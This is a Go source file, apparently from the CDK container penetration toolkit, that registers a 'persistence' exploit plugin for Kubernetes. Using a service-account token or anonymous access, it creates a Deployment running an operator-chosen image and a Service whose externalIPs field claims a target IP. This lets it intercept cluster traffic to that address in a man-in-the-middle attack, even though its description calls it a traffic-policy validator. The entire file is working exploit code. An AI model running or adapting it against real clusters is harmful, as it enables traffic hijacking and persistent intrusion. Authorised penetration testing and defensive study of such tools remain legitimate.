//go:build !no_k8s_clusterip_check
// +build !no_k8s_clusterip_check

/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package persistence

import (
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"

	"github.com/cdk-team/CDK/pkg/audit/base"

	"github.com/cdk-team/CDK/conf"
	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/tool/kubectl"
)

var K8sDeploymentsAPI = "/apis/apps/v1/namespaces/default/deployments"
var K8sMitmPayloadDeploy = `{
    "apiVersion": "apps/v1",
    "kind": "Deployment",
    "metadata": {
        "name": "validator-payload-deploy"
    },
    "spec": {
        "replicas": 1,
        "selector": {
            "matchLabels": {
                "app": "validator-payload-deploy"
            }
        },
        "template": {
            "metadata": {
                "labels": {
                    "app": "validator-payload-deploy"
                }
            },
            "spec": {
                "containers": [
                    {
                        "image": "${image}",
                        "name": "validator-payload-deploy",
                        "ports": [
                            {
                                "containerPort": ${port},
                                "name": "tcp"
                            }
                        ]
                    }
                ]
            }
        }
    }
}`

var K8sServicesApi = "/api/v1/namespaces/default/services"
var K8sMitmPayloadSvc = `{
    "apiVersion": "v1",
    "kind": "Service",
    "metadata": {
        "name": "validator-externalip"
    },
    "spec": {
        "externalIPs": [
            "${ip}"
        ],
        "ports": [
            {
                "name": "tcp",
                "port": ${port},
                "targetPort": ${port}
            }
        ],
        "selector": {
            "app": "validator-payload-deploy"
        },
        "type": "ClusterIP"
    }
}`

func getK8sMitmPayloadDeployJson(image string, port string) string {
	K8sMitmPayloadDeploy = strings.Replace(K8sMitmPayloadDeploy, "${image}", image, -1)
	K8sMitmPayloadDeploy = strings.Replace(K8sMitmPayloadDeploy, "${port}", port, -1)
	return K8sMitmPayloadDeploy
}

func getK8sMitmPayloadSvcJson(ip string, port string) string {
	K8sMitmPayloadSvc = strings.Replace(K8sMitmPayloadSvc, "${ip}", ip, -1)
	K8sMitmPayloadSvc = strings.Replace(K8sMitmPayloadSvc, "${port}", port, -1)
	return K8sMitmPayloadSvc
}

// plugin interface
type K8sMitmClusteripS struct{ base.BaseExploit }

func (p K8sMitmClusteripS) Desc() string {
	return "CAP-2020-001 K8s ClusterIP ExternalIP 流量策略验证 usage: cdk run k8s-clusterip-validator (default|anonymous|<service-account-token-path>) <image> <ip> <port>"
}
func (p K8sMitmClusteripS) Run() bool {
	args := cli.Args["<args>"].([]string)
	if len(args) != 4 {
		log.Println("invalid input args.")
		log.Fatal(p.Desc())
	}

	var TokenPath = ""
	var AnonymousFlag = false

	token := args[0]
	image := args[1]
	targetIP := args[2]
	targetPort := args[3]

	switch token {
	case "default":
		TokenPath = conf.K8sSATokenDefaultPath
	case "anonymous":
		TokenPath = ""
		AnonymousFlag = true
	default:
		TokenPath = args[0]
	}

	// get api-server connection conf in ENV
	log.Println("getting K8s api-server API addr.")
	addr, err := kubectl.ApiServerAddr()
	if err != nil {
		fmt.Println(err)
		return false
	}
	fmt.Println("\tFind K8s api-server in ENV:", addr)

	// step1. create Mitm Deployments
	optsDeploy := kubectl.K8sRequestOption{
		TokenPath: TokenPath,
		Server:    addr, // default
		Api:       K8sDeploymentsAPI,
		Method:    "POST",
		PostData:  "",
		Anonymous: AnonymousFlag,
	}

	log.Printf("trying to create man in the middle deploy containers with image:%s and port:%s", image, targetPort)
	optsDeploy.PostData = getK8sMitmPayloadDeployJson(image, targetPort)
	resp, err := kubectl.ServerAccountRequest(optsDeploy)
	if err != nil {
		fmt.Println(err)
	}
	log.Println("api-server response:")
	fmt.Println(resp)

	// step2. create Mitm Services of ExternalIPs
	optsSvc := kubectl.K8sRequestOption{
		TokenPath: TokenPath,
		Server:    addr, // default
		Api:       K8sServicesApi,
		Method:    "POST",
		PostData:  "",
		Anonymous: AnonymousFlag,
	}
	log.Printf("trying to create man in the middle ExternalIPs svc ip: %s and port: %s", targetIP, targetPort)
	optsSvc.PostData = getK8sMitmPayloadSvcJson(targetIP, targetPort)
	respSvc, err := kubectl.ServerAccountRequest(optsSvc)
	if err != nil {
		fmt.Println(err)
	}
	log.Println("api-server response:")
	fmt.Println(respSvc)

	return true
}

func init() {
	exploit := K8sMitmClusteripS{}
	exploit.ExploitType = "persistence"
	exploit.ActivePrereqs = []string{"HasK8sAPI"}
	plugin.RegisterExploit("k8s-clusterip-validator", exploit)
	rand.Seed(time.Now().UnixNano())
}
